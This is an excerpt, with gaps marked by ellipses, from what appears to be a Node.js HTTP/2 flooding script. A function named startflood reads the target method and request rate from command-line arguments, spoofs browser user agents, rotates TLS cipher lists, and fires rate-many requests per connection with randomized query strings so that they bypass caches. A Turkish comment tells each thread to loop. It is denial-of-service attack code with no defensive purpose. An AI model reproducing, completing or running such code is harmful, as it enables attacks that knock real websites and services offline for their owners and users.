...
var rate = parseInt(process.argv[7]) || 100;
...
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB) Gecko/20071114 Firefox/104.0",
...
const cplist = [
    ...
    "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA256:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:DES-CBC3-SHA:!aNULL:!eNULL:!EXPORT:!RC4:!MD5:!PSK:!SRP:!CAMELLIA"
];

function startflood() {
    const method = process.argv[5].toUpperCase();
        ...
        function createConnection(socket) {
            ...
            const tlsConn = tls.connect(tlsOptions, () => {
                ...
                for (let i = 0; i < rate; i++) {
                    const headers = Object.assign({}, headerbuilders, {
                        ':path': parsed.path + (randomparam ? `?${randomparam}=${randstr.generate({length:12})}` : ''),
    ...
    // Her thread döngü halinde çalışsın
